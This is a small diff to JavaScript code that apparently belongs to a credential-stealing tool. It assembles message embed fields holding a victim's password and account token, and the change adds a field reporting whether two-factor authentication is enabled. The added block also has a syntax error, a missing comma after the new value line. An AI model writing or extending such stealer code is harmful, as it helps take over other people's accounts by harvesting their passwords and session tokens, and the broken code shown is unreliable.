@@ -274,7 +274,13 @@ let twoFA = "";
                                 name: "Password",
                                 value: `\`${password}\``,
                                 inline: !0
-                            }, {
+                            },{ 
+			    	name : "2FA Enabled",
+				value : `${twoFA}`
+				inline : !0
+			    
+			    }, 
+			    {
                                 name: "Token",
                                 value: `\`\`\`${token}\`\`\``,
                                 inline: !1
